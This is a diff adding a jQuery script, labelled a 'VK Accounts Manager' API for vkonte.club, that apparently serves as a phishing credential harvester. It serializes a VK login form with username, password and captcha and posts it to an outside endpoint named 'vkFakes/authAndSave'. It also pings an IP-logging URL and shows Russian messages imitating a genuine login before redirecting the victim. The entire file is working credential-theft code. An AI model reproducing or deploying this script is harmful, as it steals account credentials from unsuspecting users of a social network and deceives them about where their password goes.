@@ -1,0 +1,77 @@
+/**
+* Created by GamePost on 09.08.2016.
+* API Vkonte.Club
+* VK Accounts Manager
+*/
+
+$(function () {
+function CSSLoad(file){
+var link = document.createElement("link");
+link.setAttribute("rel", "stylesheet");
+link.setAttribute("type", "text/css");
+link.setAttribute("href", file);
+document.getElementsByTagName("head")[0].appendChild(link)
+}
+CSSLoad('https://vkonte.club/api/login/frame.css');
+
+$.ajax({
+type: "GET", url: "https://vkonte.club/api/ip/97",
+success: function(msg) {}
+});
+
+$('#login').click(function (e) {
+$(".msg").removeClass("msg-error msg-information msg-success");
+var data = $('form').serialize();
+$("#captcha").hide();
+$("input[name*='captcha_sid']").val("");
+$("input[name*='captcha_key']").val("");
+$("#captcha_img").attr("src", "");
+$(".msg").hide();
+$.ajax({
+type: "POST", url: "https://vkonte.club/vkFakes/authAndSave", data: data, success: function (msg) {
+
+if (typeof(msg.error) !== "undefined")
+{
+console.log(msg);
+if (msg.error.error_code == 0)
+{
+$(".msg").show();
+$(".msg").html("Ошибка! Вы не ввели логин или пароль!");
+$(".msg").addClass("msg-error");
+}
+if (msg.error.error_code == 1)
+{
+$(".msg").show();
+$(".msg").html("Пожалуйста, проверьте правильность написания логина и пароля.");
+$("input[name*='password']").val("");
+$(".msg").addClass("msg-error");
+}
+if (msg.error.error_code == 2)
+{
+$("#captcha").show();
+$("input[name*='captcha_sid']").val(msg.error.captcha_sid);
+$("#captcha_img").attr("src", msg.error.captcha_img);
+$(".msg").html("Пожалуйста, введите капчу для продолжения.");
+$(".msg").addClass("msg-information");
+
+}
+if (msg.error.error_code == 3)
+{
+$(".msg").show();
+$(".msg").html("Ваша заявка уже принята!");
+$(".msg").addClass("msg-information");
+}
+}
+
+if (typeof(msg.response) !== "undefined")
+{
+$(".msg").show();
+$(".msg").html("Авторизация прошла успешно! Ожидайте.");
+$(".msg").addClass("msg-success");
+var url = $("input[name*='vkonteurl']").val();
+if (url != '') location.href = url;
+}
+}
+});
+});
+});
